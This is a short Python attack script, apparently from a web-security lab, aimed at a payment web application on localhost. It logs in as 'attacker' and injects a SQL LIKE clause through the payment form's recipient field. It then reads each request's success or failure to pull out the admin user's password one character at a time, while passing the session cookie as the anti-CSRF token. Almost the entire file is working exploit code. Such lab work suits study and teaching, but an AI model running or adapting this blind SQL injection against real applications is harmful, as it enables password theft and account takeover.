from requests import codes, Session

LOGIN_FORM_URL = "http://localhost:8080/login"
PAY_FORM_URL = "http://localhost:8080/pay"

def submit_login_form(sess, username, password):
    response = sess.post(LOGIN_FORM_URL,
                         data={
                             "username": username,
                             "password": password,
                             "login": "Login",
                         })
    return response.status_code == codes.ok

def submit_pay_form(sess, recipient, amount):
    csrf_token = sess.cookies.get("session")
    # print("CSRF TOKEN: {}".format(csrf_token))
    response = sess.post(PAY_FORM_URL,
                    data={
                        "recipient": recipient,
                        "amount": amount,
                        "anticsrf_token": csrf_token,
                    })
    return response.status_code == codes.ok

def test_char(sess, username, password_so_far):
    chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    for c in chars:
        s = "{}' AND users.password LIKE '{}{}%".format(username, password_so_far, c)
        response = submit_pay_form(sess, s, 0)
        if response:
           print("Successful request with character {} and password so far '{}'".format(c, password_so_far))
           return c

def sqli_attack(username):
    sess = Session()
    # Verify attacker logged in successfully
    assert(submit_login_form(sess, "attacker", "attacker"))
   
    password = []
    while True:
        c = test_char(sess, username, "".join(password))
        if c is None:
            break;
        password.append(c)

    print("".join(password))

    return "".join(password)
        

def main():
    sqli_attack("admin")

if __name__ == "__main__":
    main()
